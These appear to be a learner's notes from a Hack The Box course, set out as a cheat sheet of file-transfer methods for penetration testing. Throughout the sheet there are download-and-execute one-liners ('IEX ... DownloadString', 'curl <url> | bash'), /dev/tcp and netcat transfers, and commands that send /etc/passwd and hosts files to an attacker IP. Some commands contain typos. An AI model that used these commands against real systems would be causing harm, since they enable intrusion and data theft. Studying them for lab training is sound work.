# file transfers (hack the box)

## windows file transfers

### File Download

#### Download File

```powershell
(New-Object Net.WebClient).DownloadFile('<url>','<dst>')
```

#### Download File (does not block calling thread)

```powershell
(New-Object Net.WebClient).DownloadFileAsync('<url','dst')
```

#### Fileless method (Execute from memory)

```powershell
IEX(New-Object Net.WebClient).DownloadString('<url'>)
```

```powershell
(New-Object Net.Webclient).DownloadString('<url'>) | Invoke-Expression
```

```powershell
Invoke-WebRequest <url> -Outfile <output file>
```

#### Common errors

- Internet Explorer not initialized (Invoke-WebRequest) use -UseBasicParsing
- TLS/SSL secure channel not established use:

```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationChallback = {$true}
```

### Base64 Encoding and Decoding

#### Encode String (Bash)

```bash 
cat <file> | base64 -w 0; echo
 ```

#### Encode String Powershell (older)

 ```powershell
 $filebytes = Get-Content -Path "<path to file>" -AsByteStream -Raw
 $base64string = [Convert]::ToBase64String($filebytes)
 ```

#### Encode String Powershell (newer)

 ```powershell
$filebytes = Get-Content -Path "<path to file>" -Encoding Byte -Raw
$base64string = [Convert]::ToBase64String($filebytes)
 ```

#### Decode Base 64 String (Powershell)

```powershell

[IO.File]::WriteAllBytes("<file>"), [Convert]::FromBase64String("<string>")
```

### Check file hashes

#### powershell (md5)

```powershell
Get-FileHash -Algorithm md5
```

#### bash (md5)

```bash
md5sum <file>
```
# SMB file transfers

## Create SMB Server (impacket)

```bash
sudo impacket-smbserver share -smb2support <location of share>
```

## Retrieve File from smb share (cmd)

```cmd
copy \\<ip address of smb server>\<share name>\<file>
```

## Create password enabled SMB share (impacket)

```bash
sudo impacket-smbserver share -smb2support <location of share> -user <arbitrary username> -password <password>
```

# ftp
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib --port 21

```
- access from windows
```powershell
(New-Object Net.WebClient).DownloadFile('ftp://<ip>/file.txt', '<destination>')
```
- without interactive shell
```cmd
echo open <ip> > ftpcmd.txt
echo USER anonymous >> ftpcmd.txt
echo binary >> ftpcmd.txt
echo GET file.txt >> ftpcmd.txt
echo bye >> ftpcmd.txt
ftp -v -s -s:ftpcmd.txt
```
## uploading

```powershell
# convert to base64
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```
- decode
```bash
echo "<b64encodedtext>" | base64 -d >> file.txt
```

- using python upload server
```bash
pip3 install uploadserver
python3 -m uploadserver
```
- then on windows
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```
- or we can send via post request to netcat
```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64

```
## webDAV
web dav is an alternative to SMB which allows file collaboration over http/https
- python modules
```bash
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```
then you should be able to navigate to it as a file in a file share on windows
```cmd
dir \\192.168.49.128\DavWWWRoot
# davwwwroot is just a link to the webroot, doesn't exist in your filesystem, you can specify a share name instead
```
### ftp uploads
- start a writable ftp server in python
```bash
sudo python3 -m pyftpdlib --port 21 --write
```
- then use powershell to upload a file 
```powershell
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```
you can also use the command file shown earlier

# try this for uploads from windows
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')













## Mount password protected smb server(cmd)

```cmd
net use <new drive letter:> \\<ip address of smb server>\<share name> /user:<username> <password>
```

## Mount password protected smb server (powershell)
### Create credential object

```powershell
$user = "username"
$password = ConvertTo-SecureString -String "password" -AsPlainText -Force
$Credential = New-Object -Typename System.Management.Automation.PSCredential -ArgumentList $user, $password 
```

### Mount share with credential object

```powershell
New-PSDrive -Name <drive letter> -PSProvider FileSystem -Root \\<server>\<share> -Credential $Credential -Persist
```

### unmount share (powershell)

```powershell
Remove-PSDrive -Name <assigned drive letter>
```

## unmount share (cmd)

```cmd
net use <mounted share drive letter>: /d

```
### netcat
#### reciever
```bash
nc -l -p 1234 > out.file
```
#### sender
```
nc -w 3 [destination] 1234 < out.file
```

# linux file transfers
with bash version 2.04 installed we can connect directly using sockets if file tranfer tools are not available this would be considered fileless
```bash
exec 3<>/dev/tcp/10.10.10.32/80
echo -e "GET /file.txt HTTP/1.1\n\n"> &3
cat <&3
```
- plus the usual wget and curl
curl <url> | bash
wget <url> | bash

## upload with python3 upload server
```bash
sudo python3 -m pip install --user uploadserver
```
-  to use ssl/tls create a certificate
```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```
- start the server
```bash
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem 
```
- transfer multiple files
```bash
curl -X POST https://<ip>/upload -F 'files=@/path/to/file' -F 'files=@/path/to/file' --insecure
```
- Stand up a quick webserver

```python
python3 -m http.server
# or in python 2
python -m SimpleHttpServer
```
- or with php
```bash
php -s 0.0.0.0:8000
```
- or with ruby
```ruby
ruby -run -ehttpd . -p8000
```
- getting a file with get in python
```python
import requests

url = 'http://10.129.138.131/flag.txt'
r = requests.get(url, allow_redirects=True)
open('flag.txt', 'wb').write(r.content)
```
# transferring files with code
- python2.7
```python
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```
- python3
```python
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

- php
```php
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```
```php
php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

```php
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

```ruby
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

```perl
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```
- javascript create a file like this 
```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));

```

- then run
```javascript
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

- vbscript save a file
```powershell
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```
- then execute (windows)
```cmd
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

### python upload methods
```python
python3 -m uploadserver

```
```python
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

## file transfers with Netcat and ncat
```bash
# compromised machine open a listening port 
# origianl nc
nc -lvnp 8000 > file.exe
# ncat
ncat -l -p 8000 --recv-only > file.exe
```
- send the file from attacker
```bash
nc -q 0 <ip> <port> < file.exe
# with ncat
ncat --send-only <ip> <port> < file.exe

```
- do the opposite to well, do the opposite

- if nc is not installed try this
```cat < /dev/tcp/<ip>/<port> > file.exe```

# encrypting files with aes

- windows
```powershell
# first install DR tools Module
Import-Module .\Invoke-AesEncryption.ps1
Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
```
- linux
```bash
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
```
```bash
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```
# using nginx
- make a directory with mkdir -p
- make sure either the www-data or http user is owner of the directory and its contents
- you can uncomment the default user in nginx.conf
- create or add to the /etc/nginx/sites-available a file like :
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
- symlink sites-available to sites-enabled sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/

then you can curl -T flag.txt http://192.168.50.93:9001/SecretUploadDirectory/flag.txt
